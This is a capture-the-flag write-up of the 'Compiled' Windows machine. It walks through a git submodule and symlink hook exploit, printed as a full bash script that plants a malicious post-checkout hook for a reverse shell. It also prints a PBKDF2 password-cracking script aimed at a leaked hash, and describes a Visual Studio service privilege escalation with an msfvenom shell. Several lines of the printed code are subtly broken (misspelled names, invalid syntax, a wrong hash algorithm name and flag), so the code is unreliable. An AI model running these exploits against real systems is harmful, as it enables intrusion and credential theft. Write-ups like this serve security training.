---
layout: post
title: "Compiled-Windows-Medium"
date:   2025-07-12 12:05:57 -0400
categories: writeups
thumb: /assets/images/logos/ea0bd450c67da1efd2058c2cab9400cf.webp
---

# Compiled

# 1. Enumeration

Start performing the corresponding nmap scan, there are 2 web applications running, one in 3000 and another in 5000

![Untitled]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled.png' | relative_url }})

In 3000 there is a gitea service where we are able to log in

![Untitled]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_1.png' | relative_url }})

In 5000 there is a compiler where we can enter a repository, first we test some unintended inputs, but it looks to be sanitized

![Untitled]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_2.png' | relative_url }})

# 2. User flag

Having no more information we proceeded to create an account in the gitea service

![Untitled]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_3.png' | relative_url }})

Effectively we can create new repositories 

![Untitled]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_4.png' | relative_url }})

![Untitled]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_5.png' | relative_url }})

We also could see repositories other user’s

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image.png' | relative_url }})

A key part to find the foothold is the gitea version disclosed on the footer’s page, we searched gitea cves but we only found a stored XSS but the versions didn’t match pretty well

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_1.png' | relative_url }})

As we can see on gitea’s web page, and we can infer due to its name it is based on git, even when it is not so common we can search git vulnerabilities

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_2.png' | relative_url }})

There is a recent vulnerability, it could matching with what we are looking for

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_3.png' | relative_url }})

A blog explaining the CVE is in there but first at all let’s see whether it will be helpful

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_4.png' | relative_url }})

Looking around changelog version we realize it is running with a vulnerable version of git

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_5.png' | relative_url }})

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_6.png' | relative_url }})

Now we can focus a little bit more on the vulnerability, basically it is executing hooks without proper control in files called recursively, the issue is due to bad symbolic links handle by git.

```bash
#!/bin/bash

#Configure Git to allow file protocol and enable symbolic links

#We need to allow file:// protocol to manage local repos
git config --global protocol.file.allow always
#Allow symbolic links
git config --global core.symlinks true
#Main will be the main branch (good practice to avoid master)
git config --global init.defaultBranch main

#Clean up any existing repositories
rm -rf repo1
rm -rf repo2

#Clone the malicious repo
git clone <repo1.git>
cd repo1

#Create the malicious post-checkout hook
mkdir -p y/hooks
##!bin/sh.exe could be executed when we have Git bash 
#Or another unix terminal on windows
cat > y/hooks/post-checkout <<EOF
<payload>
EOF
chmod +x y/hooks/post-checkout

#Add, commit and push the malicious hooks
git add y/hooks/post-checkout
git commit -m "Add malicious post-checkout hook"
git push
cd ..

#Clone another repo and set up the submodule
git clone <repo2.git>
cd repo2
#Creating a submodule named x/y in A/modules/x
#The submodule helps to keep the connection with other repositories
git submodule add --name x/y "<repo1.git>" A/modules/x
git commit -m "Add submodule"

#Create a symbolic link to the .git directory
#Only saving ".git" in a .txt, we are manipulating git
#Because it is in charge of manage which files are going to be commited
#That's how git is referenced indirectly
#y/hooks/post-checkout is part of this, and when we are cloning the repo
#the malicious hook is taken
printf ".git" > dotgit.txt
#Creating a git object and saving its hash
git hash-object -w -stdin < dotgit.txt > dot-git.hash
#Saving info in the index git format
#Mapping state and location of the index.info
printf "1200 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
#Manipulating git index 
git update-index --index-info < index.info
git commit -m "Add symbolic link"
git push
```

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_7.png' | relative_url }})

To make this exploit work, we need to create two empty repos 

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_8.png' | relative_url }})

Execute the script

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_9.png' | relative_url }})

those are all the actions made

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_10.png' | relative_url }})

To trigger the rev shell we need to compile the repository in the web application previously mentioned 

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_11.png' | relative_url }})

Now we have access as Richard

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_12.png' | relative_url }})

We found the gitea database, download it using python

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_13.png' | relative_url }})

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_14.png' | relative_url }})

There is a split pbdfkf2 up hash, it’s important to node that emily is the only one who needs change password, it might be due to a default password or due to a weak one

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_15.png' | relative_url }})

```python
import binascii, hashlib

#Funcion to genereate the PBKDF3 hash from a password

def pbkdf2_hash(password, salt, iterations=50000, dklen=50):
	#Generating hash using SHA-256 as internal function
	hash_value = hashlib.pbkdf2_hmac(
		'sha-256',
		password.encode('utf-8'), #Converting to bytes
		salt,
		iterations, 
		dklen=dklen
	)
	
	return hash_value
	
def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50)

	#Converting target hash to bytes
	target_hash_bytes= binascci.unhexlify(targethash)
	with open(dictionary_file, 'r', encoding='utf-8') as file:
		for line in file:
			#Delete blank spaces
			password: line.strip()
			
			#Generate the hash for the current password
			hash_value = pbdkf2_hash(password,salt,iterations,dklen)
			
			#Comparing hashes
			if hash_value == target_hash_bytes:
				print(f"Found password: {password}")
				return password
				
		print("Password not found")
		return None
			
#COnverting salt to bytes
salt = binascii.unhexlify('227d873cca89103cd83a976bdac52486')
target_hash = '97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16' 
dictionary_file = '/usr/share/wordlist/rockyou.txt'

find_matching_password(dictionary_file, target_hash, salt)
```

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_16.png' | relative_url }})

Then are going to be able to open a session as emily and get the user flag

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_17.png' | relative_url }})

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_18.png' | relative_url }})

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_19.png' | relative_url }})

# 3.Priv esc

If we dig a little bit more in the machine we found that visual studio is installed, there is a recent vulnerability found in VSStandardCollectorService

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_20.png' | relative_url }})

We only need to fix the path where the exploit will search into VSDiagnostics

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_21.png' | relative_url }})

In visual studio 2022 we had need to add the W at the end of some statements

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_22.png' | relative_url }})

Set the payload to a new one with the path of the rev shell generated by msfvenom

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_23.png' | relative_url }})

To compile the project it is necessary to use Developer command prompt

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_24.png' | relative_url }})

Using cl set some initial parameters and get the .exe to execute 

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_25.png' | relative_url }})

Use runnas to get system shell

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_26.png' | relative_url }})

![image.png]({{ '/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_27.png' | relative_url }})

Machine pwned!!! But this machine was a pain of head i don’t think it is a medium machine, i had a lot of problems compiling the CVE i saw on internet that there is a better way compiling it using MSBUILD but it will be part of another compiled machine. We also need to compile it in release mode.

<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
